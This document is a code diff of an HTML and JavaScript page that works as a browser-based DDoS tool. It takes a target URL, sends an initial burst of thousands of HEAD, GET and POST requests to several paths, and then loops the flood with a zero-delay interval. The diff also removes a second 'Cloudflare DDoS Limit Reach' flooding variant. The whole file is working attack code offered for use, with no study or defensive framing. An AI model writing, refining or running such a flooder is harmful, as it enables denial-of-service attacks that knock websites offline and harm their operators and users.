@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Select DDoS Attack Tool</title>
+    <title>Aggressive DDoS Attack</title>
     <style>
         body {
             font-family: 'Arial', sans-serif;
@@ -16,7 +16,7 @@
             font-size: 2.5em;
             margin-bottom: 20px;
         }
-        input[type="radio"], button {
+        input[type="text"], button {
             padding: 10px;
             margin: 5px;
             font-size: 1em;
@@ -24,10 +24,9 @@
             border-radius: 5px;
             cursor: pointer;
         }
-        input[type="radio"] {
-            width: auto;
-            height: auto;
-            margin-right: 10px;
+        input[type="text"] {
+            width: 100%;
+            max-width: 400px;
         }
         button {
             background: #61dafb;
@@ -53,50 +52,38 @@
     </style>
 </head>
 <body>
-    <h1>Select DDoS Attack Tool</h1>
-    <p>
-        <input type="radio" id="tool1" name="ddosTool" value="aggressive" checked>
-        <label for="tool1">Aggressive DDoS Attack</label>
-    </p>
-    <p>
-        <input type="radio" id="tool2" name="ddosTool" value="cloudflare">
-        <label for="tool2">Cloudflare DDoS Limit Reach</label>
-    </p>
-    <button id="startButton" onclick="startSelectedAttack()">Start Attack</button>
+    <h1>Aggressive DDoS Attack</h1>
+    <p>Target URL: <input type="text" id="targetURL" placeholder="https://example.com"></p>
+    <button id="attackButton" onclick="toggleAttack()">Start Attack</button>
     <div id="status"></div>
     <div id="console"></div>
 
     <script>
-        let isAttacking = false;
         let attackInterval;
+        let isAttacking = false;
 
-        function startSelectedAttack() {
-            const selectedTool = document.querySelector('input[name="ddosTool"]:checked').value;
-            const statusDiv = document.getElementById('status');
-            const consoleDiv = document.getElementById('console');
+        function toggleAttack() {
+            const attackButton = document.getElementById('attackButton');
+            const targetURL = document.getElementById('targetURL').value;
+            if (!targetURL) {
+                document.getElementById('status').innerText = 'Please enter a valid target URL.';
+                return;
+            }
 
-            // Clear previous outputs
-            statusDiv.innerText = '';
-            consoleDiv.innerHTML = '';
-
-            if (selectedTool === 'aggressive') {
-                // Initialize and start the aggressive DDoS attack
-                const targetURL = prompt("Enter the target URL for the Aggressive DDoS Attack:");
-                if (targetURL) {
-                    document.getElementById('status').innerText = 'Attack in progress...';
-                    startAttackAggressive(targetURL);
-                }
-            } else if (selectedTool === 'cloudflare') {
-                // Initialize and start the Cloudflare DDoS attack
-                const targetURL = prompt("Enter the target URL for the Cloudflare DDoS Limit Reach:");
-                if (targetURL) {
-                    document.getElementById('status').innerText = 'Attack in progress...';
-                    startAttackCloudflare(targetURL);
-                }
+            if (!isAttacking) {
+                document.getElementById('status').innerText = 'Attack in progress...';
+                attackButton.innerText = 'Stop Attack';
+                isAttacking = true;
+                startAttack(targetURL);
+            } else {
+                document.getElementById('status').innerText = 'Attack stopped.';
+                attackButton.innerText = 'Start Attack';
+                isAttacking = false;
+                stopAttack();
             }
         }
 
-        function startAttackAggressive(targetURL) {
+        function startAttack(targetURL) {
             function sendRequest(method, path) {
                 const xhr = new XMLHttpRequest();
                 xhr.open(method, targetURL + path, true);
@@ -108,6 +95,7 @@
                 xhr.send();
             }
 
+            // Initial burst of 2000 requests for each method and path
             const methods = ['HEAD', 'GET', 'POST'];
             const paths = ['/', '/index.html', '/api', '/randompath'];
             for (let i = 0; i < 2000; i++) {
@@ -116,6 +104,7 @@
                 });
             }
 
+            // Aggressive looping for each method and path
             attackInterval = setInterval(() => {
                 methods.forEach(method => {
                     paths.forEach(path => sendRequest(method, path));
@@ -123,36 +112,10 @@
             }, 0);
         }
 
-        function startAttackCloudflare(targetURL) {
-            function sendRequest(method) {
-                const xhr = new XMLHttpRequest();
-                xhr.open(method, targetURL, true);
-                xhr.withCredentials = true;
-                xhr.onreadystatechange = function() {
-                    if (xhr.readyState === 4) {
-                        consoleOutput(`${method} ${xhr.status}: ${xhr.responseURL}`);
-                    }
-                };
-                xhr.send();
-            }
-
-            const methods = ['HEAD', 'GET', 'POST'];
-            for (let i = 0; i < 2000; i++) {
-                methods.forEach(method => sendRequest(method));
-            }
-
-            attackInterval = setInterval(() => {
-                methods.forEach(method => sendRequest(method));
-            }, 100);
-        }
-
         function stopAttack() {
             if (attackInterval) {
                 clearInterval(attackInterval);
             }
-            isAttacking = false;
-            document.getElementById('startButton').innerText = 'Start Attack';
-            document.getElementById('status').innerText = 'Attack stopped.';
         }
 
         function consoleOutput(message) {
@@ -162,14 +125,6 @@
             consoleDiv.appendChild(newMessage);
             consoleDiv.scrollTop = consoleDiv.scrollHeight; // Auto-scroll to the bottom
         }
-
-        document.getElementById('startButton').addEventListener('click', function() {
-            if (isAttacking) {
-                stopAttack();
-            } else {
-                startSelectedAttack();
-            }
-        });
     </script>
 </body>
 </html>
